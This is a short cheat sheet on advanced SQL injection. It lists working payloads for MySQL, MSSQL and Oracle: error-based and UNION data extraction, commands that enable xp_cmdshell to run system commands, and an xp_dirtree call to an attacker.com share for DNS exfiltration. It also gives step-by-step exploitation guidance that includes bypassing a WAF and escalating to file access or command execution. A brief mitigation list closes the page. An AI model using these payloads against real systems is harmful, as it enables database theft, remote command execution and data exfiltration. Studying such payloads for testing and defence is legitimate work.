📌 Advanced SQL Injection

🧠 Description

Advanced SQL injection techniques go beyond basic error‑based or union‑based attacks. They leverage database‑specific functions, encoding, obfuscation, and server‑side features to extract data, escalate privileges, or achieve remote code execution.

💣 Advanced Payloads by Database

MySQL Advanced

' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --

MSSQL Advanced

'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --
'; EXEC xp_dirtree '\\attacker.com\share' -- (DNS exfiltration)

Oracle Advanced

' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) --
' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual --

⚙️ Exploitation Steps

  1. Identify injection point and database type.
  2. Use advanced error payloads to extract version, database name, user.
  3. If error‑based not possible, use time‑based boolean with binary search.
  4. Apply obfuscation to bypass WAF.
  5. Escalate to file read/write or command execution.

🛡️ Mitigation

✅ Parameterized queries (prepared statements)
✅ WAF with advanced rule sets
✅ Disable dangerous functions (xp_cmdshell, UDF)
✅ Regular security updates
